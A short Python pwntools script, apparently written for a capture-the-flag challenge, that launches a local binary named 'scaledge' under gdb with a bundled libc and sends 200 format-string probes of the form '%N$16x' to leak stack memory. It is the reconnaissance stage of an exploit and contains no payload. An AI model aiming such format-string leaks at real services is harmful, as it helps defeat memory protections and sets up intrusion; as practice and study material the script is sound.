#!/usr/bin/python
from pwn import *

def pwn (r):
	for loop in range (200):
		leak = "%"
		leak += "%d" % loop
		leak += "$16x"
		r.sendline (leak)
		print r.recv (2048)
	pause ()

if __name__ == '__main__':
	r = process ('./scaledge', env = {'LD_PRELOAD' : './libc-2.23.so'})
	pause ()
	gdb.attach (r)
	pwn (r)
